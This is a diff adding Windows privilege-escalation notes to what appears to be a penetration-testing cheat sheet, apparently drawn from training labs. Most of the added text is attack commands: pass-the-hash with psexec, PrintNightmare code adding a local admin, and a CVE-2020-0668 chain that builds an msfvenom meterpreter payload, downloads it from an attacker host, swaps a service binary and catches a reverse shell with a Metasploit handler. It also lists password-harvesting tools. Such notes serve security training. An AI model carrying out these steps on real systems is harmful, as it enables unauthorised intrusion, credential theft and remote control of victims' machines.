@@ -30,6 +30,53 @@
 
 **ATTENTION: Kernel exploits are often unstable and could crash the system**
 
+### Famous kernel exploit
+
+- MS08-067 - vulnerability in the "Server" service
+- MS17-010 - EternalBlue - remote code execution vulnerability
+- CVE-2021-36934 HiveNightmare - SeriousSam - Windows 10 flaw that results in ANY user having rights to read the Windows registry
+
+### Enumeration and Exploitation Examples
+
+- `icacls c:\Windows\System32\config\SAM` check perm on SAM file
+- Exploit CVE-2021-36934 with this [poc](https://github.com/cube0x0/CVE-2021-36934) you will get hash and then will be able to get a shell for instance with psexec `psexec.py INLANEFREIGHT/administrator@10.129.43.13 -hashes aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54` 
+- Check for spooler service using powershell `ls \\localhost\pipe\spoolss`
+- Add local admon with PrintNightmare with this [Powershell PoC](https://github.com/calebstewart/CVE-2021-1675)
+  - `Set-ExecutionPolicy Bypass -Scope Process`
+  - `Import-Module .\CVE-2021-1675.ps1`
+  - `Invoke-Nightmare -NewUser "username" -NewPassword "password123!" -DriverName "PrintIt"`
+  - Check if it worked `net user username`
+- Check installed updates 
+  - Powershell `systeminfo` `wmic qfe list brief` `Get-Hotfix`
+  - CMD with wmic `wmic qfe list brief`
+- CVE-2020-0668
+  - Check out this blog [post](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/)
+  - Use this [exploit](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)
+    - Download it
+    - Open it with visual studio
+    - Build it
+  - Check for a third party serv that can be leverage. Check perm on a binary `icacls "c:\path\to\leverage-bin.exe"`
+  - Generate a malicious file `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACK-IP LPORT=PORT -f exe > leverage-bin.exe`
+  - `python3 -m http.server 80` serve the binary
+  - Download 2 copy of the binary
+    - `wget http://ATTACK-IP/leverage-bin.exe -O leverage-bin.exe`
+    - `wget http://ATTACK-IP/leverage-bin.exe -O leverage-bin2.exe`
+  - Run the exploit `C:\CVE-2020-0668\CVE-2020-0668.exe C:\Users\user\Desktop\leverage-bin.exe "c:\path\to\leverage-bin.exe"`
+  - Check perm of new file `icacls 'c:\path\to\leverage-bin.exe'`
+  - Replace with malicious binary `copy /Y C:\Users\user\Desktop\leverage-bin2.exe "c:\path\to\leverage-bin.exe"`
+  - Use a Metasploit Resource Script
+    - Make a file named handler.rc and put this in it
+      ```
+      use exploit/multi/handler
+      set PAYLOAD windows/x64/meterpreter/reverse_https
+      set LHOST <our_ip>
+      set LPORT 8443
+      exploit
+      ```
+    - Launch metasploit this the resource script `msfconsole -r handler.rc`
+  - Start the service `net start leverage-serv`
+  - Even if we get an error we should have a reverse shell in meterpreter
+
 ### Tools
 
 #### Executables
@@ -53,6 +100,7 @@
 - [SessionGopher](https://github.com/Arvanaghi/SessionGopher) is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information.
 - [LaZagne](https://github.com/AlessandroZ/LaZagne) is a tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more
 - [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) is a suite of tools that is used to monitor, manage and troubleshoot the Windows operating system owned by Microsoft. It is really useful for enumeration.
+- [Security Update Guide](https://msrc.microsoft.com/update-guide/vulnerability)
 
 #### Pre-compiled binaries. 
 
